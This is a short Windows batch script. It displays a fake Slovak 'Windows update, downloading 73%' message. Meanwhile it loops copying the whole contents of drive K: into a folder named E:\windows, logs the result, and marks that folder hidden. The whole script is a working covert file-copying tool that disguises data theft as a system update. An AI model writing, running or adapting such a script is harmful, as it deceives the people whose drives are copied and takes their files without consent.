@echo off
echo -------------------------------------
echo Windows aktualizacia...
echo -------------------------------------
echo stahovanie... 73%
:start
echo ------------------------------------- >> E:\OUTPUT.txt
echo start >> E:\OUTPUT.txt
echo ------------------------------------- >> E:\OUTPUT.txt



robocopy "K:" "E:\windows" /COPY:DAT /S /E >> E:\OUTPUT.txt
if %ERRORLEVEL% EQU 1 echo ***OKCOPY*** >> E:\OUTPUT.txt &attrib +h "E:\windows"

goto start
exit



cmd.exe